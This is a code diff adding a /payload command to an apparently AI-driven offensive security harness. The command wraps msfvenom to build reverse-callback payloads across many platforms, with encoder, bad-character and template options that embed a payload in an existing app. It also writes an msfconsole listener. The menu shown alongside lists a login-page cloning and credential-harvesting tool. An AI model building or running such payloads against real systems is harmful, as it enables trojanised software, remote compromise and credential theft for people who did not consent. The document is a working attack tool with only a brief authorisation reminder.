@@ -43,6 +43,7 @@ from .. import osint as osint_mod
 from .. import openrouter as or_mod
 from .. import osint_tree as osint_tree_mod
 from .. import phish as phish_mod
+from .. import payload as payload_mod
 from .. import reverse as reverse_mod
 from .. import session as session_mod
 from .. import shodan as shodan_mod
@@ -164,6 +165,83 @@ def _upstream_style(palette, tier: str) -> str:
         "single": palette.red,
         "unknown": palette.dim,
     }.get(tier, palette.dim)
+
+
+def _parse_payload_args(args) -> tuple[dict, str]:
+    """Parse `/payload`'s arguments. Returns ``(opts, err)``.
+
+    Split out of the command so the parse is testable on its own, the same
+    shape as ``_parse_crack_args``. Every malformed flag is refused here with
+    the value named, rather than silently becoming part of the extension or a
+    nonsense port — a wrong ``--lport`` produces a payload that calls back
+    nowhere, and that failure is invisible until delivery.
+    """
+    opts: dict = {
+        "ext": "",
+        "lhost": None,
+        "lport": payload_mod.DEFAULT_LPORT,
+        "payload": None,
+        "encoder": None,
+        "iterations": None,
+        "bad_chars": None,
+        "template": None,
+        "out": None,
+        "dry_run": False,
+        "handler_only": False,
+    }
+
+    valued = {
+        "--lhost": "lhost", "--lport": "lport", "--payload": "payload",
+        "--encoder": "encoder", "--iterations": "iterations",
+        "--bad-chars": "bad_chars", "--template": "template", "--out": "out",
+    }
+
+    i = 0
+    while i < len(args):
+        arg = args[i]
+        name = arg.partition("=")[0]
+        if name in valued:
+            value = arg.partition("=")[2] if "=" in arg else (
+                args[i + 1] if i + 1 < len(args) else "")
+            if "=" not in arg:
+                i += 1  # consume the value too
+            if not value:
+                return opts, f"{name} needs a value"
+            key = valued[name]
+            if key == "lport":
+                if not value.isdigit():
+                    return opts, f"--lport takes a port number, not {value!r}"
+                port = int(value)
+                if not (1 <= port <= 65535):
+                    return opts, f"--lport must be 1-65535, not {port}"
+                opts["lport"] = port
+            elif key == "iterations":
+                if not value.isdigit():
+                    return opts, f"--iterations takes a number, not {value!r}"
+                opts["iterations"] = int(value)
+            else:
+                opts[key] = value
+        elif arg in ("--dry-run", "-n"):
+            opts["dry_run"] = True
+        elif arg == "--handler":
+            opts["handler_only"] = True
+        elif arg.startswith("--"):
+            return opts, (
+                f"unknown flag {arg!r} — /payload takes <ext> "
+                "[--lhost IP] [--lport N] [--payload ID] [--encoder E] "
+                "[--iterations N] [--bad-chars B] [--template FILE] "
+                "[--out PATH] [--dry-run] [--handler]")
+        elif not opts["ext"]:
+            opts["ext"] = arg
+        else:
+            return opts, (
+                f"unexpected extra argument {arg!r} — /payload takes one "
+                "extension")
+        i += 1
+
+    if not opts["ext"]:
+        return opts, "usage: /payload <ext>  — /payload with no argument lists them"
+    return opts, ""
 
 
 def _parse_crack_args(args) -> tuple[str, int | None, float, bool, str]:
@@ -2128,6 +2206,11 @@ class ZimZillaApp(App):
         # turn, so `_cmd_reverse_engineer` refuses itself when busy, the same
         # way `/ad` does.
         "reverse-engineer", "reverse-engineer-tools",
+        # `/payload <ext> --dry-run` and `--handler` print a command and start
+        # no turn, so they are worth having mid-run — reading the argv for a
+        # format while another turn is cooking is exactly when you want it.
+        # A real build refuses itself when busy, the same way `/ad` does.
+        "payload",
     })
 
     def _handle_command(self, text: str) -> None:
@@ -2161,6 +2244,7 @@ class ZimZillaApp(App):
             "shodan-vuln-search": lambda a: self._cmd_shodan_search("vuln", a),
             "shodan-search": lambda a: self._cmd_shodan_search("raw", a),
             "phish": lambda a: self._cmd_phish(a),
+            "payload": lambda a: self._cmd_payload(a),
             "bug-hunt": lambda a: self._cmd_bug_hunt(a),
             "scope-validator": lambda a: self._cmd_scope_validator(a),
             "ad": lambda a: self._cmd_ad(a),
@@ -2302,6 +2386,9 @@ class ZimZillaApp(App):
             ("/shodan-vuln-search <q>", "hosts Shodan flagged with a known CVE"),
             ("/shodan-search <query>", "run any Shodan query verbatim, then analyse"),
             ("/phish <host>", "clone a login page, serve it, harvest creds"),
+            ("/payload <ext>", "analyse an extension, build a payload, print the listener"),
+            ("/payload <ext> --dry-run", "print the exact msfvenom command, build nothing"),
+            ("/payload <ext> --handler", "the msfconsole listener only"),
             ("/scope-validator", "paste a programme overview → allow.yaml, out-of-scope.yaml, ranked targets"),
             ("/bug-hunt <target>", "recon, then one wave of 10 agents"),
             ("/bug-hunt <target> --wave N", "run wave N specifically"),
@@ -6042,6 +6129,279 @@ class ZimZillaApp(App):
         self.query_one(ChatPane).write_block(t)
         self._launch_phish(target)
 
+    # ---- /payload ----------------------------------------------------------
+    def _cmd_payload(self, args) -> None:
+        """/payload <ext> — analyse an extension, build a payload, print the listener.
+
+        Deterministic, not a model turn: the extension is looked up in a table
+        whose every pairing was measured against a real msfvenom, the argv is
+        built from that row, and the build runs as a subprocess. Nothing here
+        asks a model what an APK payload looks like, because the answer is a
+        binary the operator is about to deliver and "the model recalled it"
+        is not a good enough provenance for that.
+
+        `--dry-run` prints the exact argv and builds nothing, which is the
+        flag that makes this safe to point at a format you are unsure of. The
+        argv it prints is the one the real run would use — same function, so
+        the two cannot drift.
+        """
+        p = self.palette
+
+        if not args:
+            self._payload_list()
+            return
+
+        # `list` is a verb as well as the no-argument default, so
+        # `/payload list` reads the way an operator expects.
+        if args[0].lower() in ("list", "ls", "--list"):
+            self._payload_list()
+            return
+
+        opts, err = _parse_payload_args(args)
+        if err:
+            self._sys_line(err, warn=True)
+            return
+
+        spec = payload_mod.resolve(opts["ext"])
+        if spec is None:
+            known = " ".join(payload_mod.extensions())
+            self._sys_line(
+                f"unknown extension: {opts['ext']} — /payload with no argument "
+                f"lists them all", warn=True)
+            self._sys_line(f"  {known}", warn=False)
+            return
+
+        lhost = opts["lhost"] or payload_mod.default_lhost()
+        lport = opts["lport"]
+
+        # The analysis is printed before anything is built, so a wrong
+        # extension is caught by reading rather than by waiting for a build.
+        self.query_one(ChatPane).write_block(
+            self._render_payload_analysis(spec, lhost, lport, opts))
+
+        if opts["handler_only"]:
+            self._sys_line("--handler — nothing was built", ok=True)
+            return
+
+        if opts["dry_run"]:
+            self._sys_line(
+                "--dry-run — nothing was built, nothing was sent", ok=True)
+            return
+
+        if self.busy:
+            self._sys_line("harness is busy — Ctrl+C to interrupt", warn=True)
+            return
+
+        case = payload_mod.case_dir(self.cfg, spec)
+        out = Path(opts["out"]) if opts["out"] else case / payload_mod.output_name(
+            spec, opts["payload"])
+
+        # A template is resolved through the jail like every other path this
+        # harness is handed: a bare `app.apk` has to mean `<workdir>/app.apk`,
+        # not whatever the process cwd happens to be.
+        template = None
+        if opts["template"]:
+            from ..sandbox import SandboxError, resolve_in_jail
+            try:
+                template = resolve_in_jail(
+                    self.cfg.workdir, opts["template"], self.cfg.unsafe,
+                    must_exist=True)
+            except SandboxError as exc:
+                self._sys_line(f"refused: {exc}", warn=True)
+                return
+            # APK templates are the one case msfvenom refuses on an old
+            # apktool, and it refuses *after* unpacking — so it is checked
+            # here, before the build, and the reason is named.
+            if spec.ext == "apk":
+                ok, why = payload_mod.apktool_supports_template()
+                if not ok:
+                    self._sys_line(
+                        f"cannot use an APK template here: {why}", warn=True)
+                    return
+
+        self._sys_line(f"building {spec.ext} — this takes a few seconds…")
+        self._build_payload(spec, lhost, lport, out, opts, template, case)
+
+    @work(exclusive=True, thread=True)
+    def _build_payload(self, spec, lhost, lport, out, opts, template,
+                       case) -> None:
+        """The blocking build, off the UI thread, then a call back on it.
+
+        msfvenom takes seconds — an APK with a template takes longer — and a
+        frozen TUI during a build reads as a hang. Same shape as every other
+        blocking call in this file.
+        """
+        build = payload_mod.generate(
+            spec, lhost=lhost, lport=lport, out=out,
+            payload=opts["payload"], encoder=opts["encoder"],
+            iterations=opts["iterations"], bad_chars=opts["bad_chars"],
+            template=template,
+        )
+        self.call_from_thread(self._show_payload_build, build, case)
+
+    def _show_payload_build(self, build, case: Path) -> None:
+        """Report the build, write the handler, and say where both landed."""
+        p = self.palette
+        if not build.ok:
+            self._sys_line(f"build failed: {build.error}", warn=True)
+            # msfvenom's own output is the useful part when it fails, and it
+            # is already captured — showing the tail costs nothing and saves
+            # the operator re-running it by hand to see why.
+            tail = (build.stderr or build.stdout or "").strip().splitlines()
+            for line in tail[-6:]:
+                self._sys_line(f"  {line}")
+            return
+
+        rc = case / "handler.rc"
+        try:
+            rc.write_text(
+                payload_mod.handler_rc(build.spec, build.lhost, build.lport,
+                                       build.payload),
+                encoding="utf-8")
+        except OSError:
+            rc = None
+
+        t = Text()
+        t.append("  ◈ BUILT     ", style=f"bold {p.accent}")
+        t.append(f"{build.out}\n", style=f"bold {p.primary}")
+        t.append("  ◈ SIZE      ", style=f"bold {p.accent}")
+        t.append(f"{payload_mod.human_size(build.size)}", style=p.primary)
+        t.append(f"   in {build.seconds:.1f}s\n", style=p.dim)
+        if build.sha256:
+            t.append("  ◈ SHA256    ", style=f"bold {p.accent}")
+            t.append(build.sha256[:32] + "…\n", style=p.dim)
+        t.append("  ◈ PAYLOAD   ", style=f"bold {p.accent}")
+        t.append(f"{build.payload}\n", style=p.primary)
+        t.append("  ◈ CALLBACK  ", style=f"bold {p.accent}")
+        t.append(f"{build.lhost}:{build.lport}\n", style=p.primary)
+        if rc is not None:
+            t.append("  ◈ HANDLER   ", style=f"bold {p.accent}")
+            t.append(f"{rc}\n", style=p.dim)
+        t.append("  ◈ CASE      ", style=f"bold {p.accent}")
+        t.append(f"{case}\n", style=p.dim)
+        t.append("\n  catch it with  ", style=p.dim)
+        t.append(f"msfconsole -r {rc}" if rc else "msfconsole", style=p.primary)
+        t.append("\n", style=p.dim)
+        self.query_one(ChatPane).write_block(t)
+
+    def _render_payload_analysis(self, spec, lhost, lport, opts) -> Text:
+        """The analysis half: what this extension is, and what will be built.
+
+        Printed before the build on purpose. An operator who typed the wrong
+        extension sees it here, in the label and the "runs on" line, rather
+        than after a build they did not want.
+        """
+        p = self.palette
+        t = Text()
+        t.append("  ◈ EXTENSION ", style=f"bold {p.accent}")
+        t.append(f".{spec.ext}", style=f"bold {p.primary}")
+        t.append(f"  {spec.label}\n", style=p.dim)
+        t.append("  ◈ RUNS ON   ", style=f"bold {p.accent}")
+        t.append(spec.runs_on + "\n", style=p.primary)
+        t.append("  ◈ FORMAT    ", style=f"bold {p.accent}")
+        if spec.format:
+            t.append(f"-f {spec.format}\n", style=p.primary)
+        else:
+            t.append("(implied by the payload — `-f apk` is an error)\n",
+                     style=p.amber)
+        t.append("  ◈ PAYLOAD   ", style=f"bold {p.accent}")
+        t.append(f"{opts['payload'] or spec.payload}\n", style=p.primary)
+        t.append("  ◈ CALLBACK  ", style=f"bold {p.accent}")
+        t.append(f"{lhost}:{lport}", style=p.primary)
+        if not opts["lhost"]:
+            t.append("  (this host's outbound address)", style=p.dim)
+        t.append("\n")
+
+        if spec.alternatives:
+            t.append("  ◈ ALSO      ", style=f"bold {p.accent}")
+            t.append(", ".join(spec.alternatives) + "\n", style=p.dim)
+
+        if spec.notes:
+            t.append("\n  NOTES\n", style=f"bold {p.accent}")
+            for note in spec.notes:
+                t.append("  · ", style=p.accent)
+                t.append(note + "\n", style=p.dim)
+
+        # The command, always — it is the thing an operator copies into their
+        # own notes, and printing it is what makes --dry-run honest.
+        out = Path(opts["out"]) if opts["out"] else Path(
+            payload_mod.output_name(spec, opts["payload"]))
+        argv = payload_mod.build_argv(
+            spec, lhost=lhost, lport=lport, out=out, payload=opts["payload"],
+            encoder=opts["encoder"], iterations=opts["iterations"],
+            bad_chars=opts["bad_chars"],
+            template=Path(opts["template"]) if opts["template"] else None,
+        )
+        t.append("\n  COMMAND\n", style=f"bold {p.accent}")
+        t.append("  " + " ".join(payload_mod._quote(a) for a in argv) + "\n",
+                 style=p.dim)
+
+        if opts["handler_only"]:
+            t.append("\n  HANDLER\n", style=f"bold {p.accent}")
+            for line in payload_mod.handler_rc(
+                    spec, lhost, lport, opts["payload"]).splitlines():
+                t.append(f"  {line}\n", style=p.dim)
+        return t
+
+    def _payload_list(self) -> None:
+        """Every extension this can build, grouped by target."""
+        p = self.palette
+        t = Text()
+        t.append("  PAYLOAD\n\n", style=f"bold {p.accent}")
+        t.append("  /payload <ext>", style=f"bold {p.primary}")
+        t.append("   analyse the extension, build it, print the listener\n",
+                 style=p.dim)
+        t.append("  /payload <ext> --dry-run", style=f"bold {p.primary}")
+        t.append("   print the command, build nothing\n", style=p.dim)
+        t.append("  /payload <ext> --handler", style=f"bold {p.primary}")
+        t.append("   the msfconsole listener only\n", style=p.dim)
+        t.append("  /payload <ext> --template FILE", style=f"bold {p.primary}")
+        t.append("   embed it in an existing artifact\n", style=p.dim)
+        t.append("  /payload <ext> --lhost IP --lport N", style=f"bold {p.primary}")
+        t.append("   set the callback\n", style=p.dim)
+
+        groups: list[tuple[str, tuple[str, ...]]] = [
+            ("ANDROID", ("apk",)),
+            ("WINDOWS", ("exe", "dll", "msi", "ps1", "hta", "vbs", "vba", "bat")),
+            ("LINUX / UNIX", ("elf", "so", "sh", "pl", "py", "rb", "js", "lua")),
+            ("MACOS", ("macho", "dylib", "app")),
+            ("JAVA", ("jar", "war", "jsp", "axis2")),
+            ("WEB", ("aspx", "asp", "php")),
+            ("SOURCE / SHELLCODE",
+             ("c", "cs", "go", "nim", "rs", "zig", "asm", "bin", "b64", "hex",
+              "txt")),
+        ]
+        for title, exts in groups:
+            live = [e for e in exts if e in payload_mod.SPECS]
+            if not live:
+                continue
+            t.append(f"\n  {title}\n", style=f"bold {p.accent}")
+            for ext in live:
+                spec = payload_mod.SPECS[ext]
+                t.append(f"  {ext:<8}", style=f"bold {p.primary}")
+                t.append(f"{spec.label:<26}", style=p.primary)
+                t.append(spec.runs_on + "\n", style=p.dim)
+
+        tool = payload_mod.probe_msfvenom()
+        t.append("\n  MSFVENOM   ", style=f"bold {p.accent}")
+        if tool.present:
+            t.append(f"{tool.path}", style=p.primary)
+            if tool.version:
+                t.append(f"  ({tool.version})", style=p.dim)
+            t.append("\n", style=p.dim)
+        else:
+            t.append("not installed — /payload cannot build anything\n",
+                     style=p.amber)
+            t.append("  ", style=p.dim)
+            t.append("apt install metasploit-framework", style=p.primary)
+            t.append("\n", style=p.dim)
+
+        t.append("\n  Every pairing here was measured against a real msfvenom.\n",
+                 style=p.dim)
+        t.append("  Point it at targets you own or are authorised to test.\n",
+                 style=p.amber)
+        self.query_one(ChatPane).write_block(t)
+
     def _phish_usage(self) -> None:
         p = self.palette
         t = Text()
@@ -8151,6 +8511,7 @@ class ZimZillaApp(App):
             ("/shodan-vuln-search", "hosts with a known CVE", "shodan-vuln-search"),
             ("/shodan-search", "any Shodan query, then analyse", "shodan-search"),
             ("/phish", "clone a login page and harvest creds", "phish"),
+            ("/payload", "build a payload for a file extension", "payload"),
             ("/bug-hunt", "recon, then one wave of 10 agents", "bug-hunt"),
             ("/ad", "Active Directory campaign — gated and interlocked", "ad"),
             ("/crack", "crack hashes offline — CPU only, budgeted", "crack"),
